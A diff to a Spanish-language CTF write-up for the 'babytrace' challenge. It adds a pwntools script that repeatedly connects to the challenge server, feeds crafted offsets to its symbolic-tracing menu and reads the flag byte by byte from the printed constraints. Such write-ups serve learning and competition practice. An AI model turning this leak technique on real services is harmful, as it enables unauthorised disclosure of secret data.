@@ -69,9 +69,54 @@ de ese offset.
 
 <p style='text-align: justify;'>
 Con lo anterior en mente podemos proceder a conectarnos al servidor, cargar el binario headerquery, agregar un valor en concreto(p.e.: 03000000), ejecutar 12 pasos (Opc. 1),
-agregar un registro simbólico (Opc. 6, rax en este caso) e imprimir las restricciones (Opc. 7) para obtener el valor de rax con ese input. Por lo que para obtener todo el flag podemos
-repetir la operacion tantas veces sea necesario hasta que obtengamos el caracter de fin del flag '}'.
+agregar un registro simbólico (Opc. 6, rax en este caso) e imprimir las restricciones (Opc. 7) para obtener el valor de rax con ese input como se puede observar al final de la siguiente 
+imagen.
 </p>
+
+![Leak]({{ '/assets/posts/babytrace/leak.png' | relative_url }}){: .center-image }
+
+<p style='text-align: justify;'>
+Por lo que para obtener todo el flag podemos repetir la operacion tantas veces sea necesario hasta que obtengamos el caracter de fin del flag '}'. Para automatizar lo anterior se diseño
+el siguiente script.
+</p>
+
+```python
+from pwn import *
+import re
+
+result = ""
+for i in range(0x30):
+	r = remote('babytrace.quals2019.oooverflow.io', 5000)
+	for j in range(49):
+		r.recvline()
+	r.recvn(8)
+	r.sendline("2")
+	r.sendline("1")
+	r.sendline("3")
+	v = ""
+	if i < 0x10:
+		v += "0"
+	v += "%x" % i
+	v += "000000"
+	r.sendline(v)
+	r.sendline("0")
+	r.sendline("1")
+	r.sendline("12")
+	r.sendline("6")
+	r.sendline("rax")
+	r.sendline("7")
+	pattern = re.compile(r'CONSTRAINTS:')
+	s = r.recvline()
+	f = re.search(pattern, s)
+	while f == None:
+		s = r.recvline()
+		f = re.search(pattern, s)
+	result += chr(int(s[28:32],0))
+	r.close()
+	if chr(int(s[28:32],0)) == '}':
+		print result
+		break
+```
 
 <p style='text-align: justify;'>
 ¿Como se obtuvo que se necesitaban 12 pasos para leer el flag? A prueba y error, ejecutando paso a paso y revisando el Output... en IDA observamos que la vulnerabilidad venia justo antes 
